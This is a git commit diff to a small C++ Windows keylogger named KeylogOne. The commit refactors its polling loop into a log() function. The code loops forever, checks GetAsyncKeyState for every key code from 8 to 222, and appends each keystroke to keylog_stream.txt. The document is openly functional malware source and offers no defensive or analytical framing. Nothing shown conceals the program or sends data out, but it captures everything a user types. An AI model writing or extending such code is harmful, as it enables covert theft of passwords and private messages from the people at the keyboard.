229e6efb5220b948563b4152915b320087208f27
pTricKg <ptrickg1976@gmail.com>
2019-03-24 23:10:47 -0600

    added log method to house code

--- KeylogOne/KeylogOne.cpp
+++ KeylogOne/KeylogOne.cpp
@@ -5,24 +5,32 @@
 
 using namespace std;
 
+void log();
+
 int main()
+{
+
+	log();
+	return 0;
+
+}
+
+void log()
 {
 	char c;
 
-		for(;;) // infinite loop
+	for(;;) // infinite loop
+	{
+		// using ASCII to collect input
+		for(c = 8; c <= 222; c++)
 		{
-			// using ASCII to collect input
-			for(c = 8; c <= 222; c++)
+			// check for user input
+			if(GetAsyncKeyState(c) == -32767)
 			{
-				// check for user input
-				if(GetAsyncKeyState(c) == -32767)
-				{
-					// ios::app prevents file rewrite with every key press
-					ofstream write("keylog_stream.txt", ios::app);
-					write << c;
-				}
+				// ios::app prevents file rewrite with every key press
+				ofstream write("keylog_stream.txt", ios::app);
+				write << c;
 			}
 		}
-	return 0;
-
+	}
 }
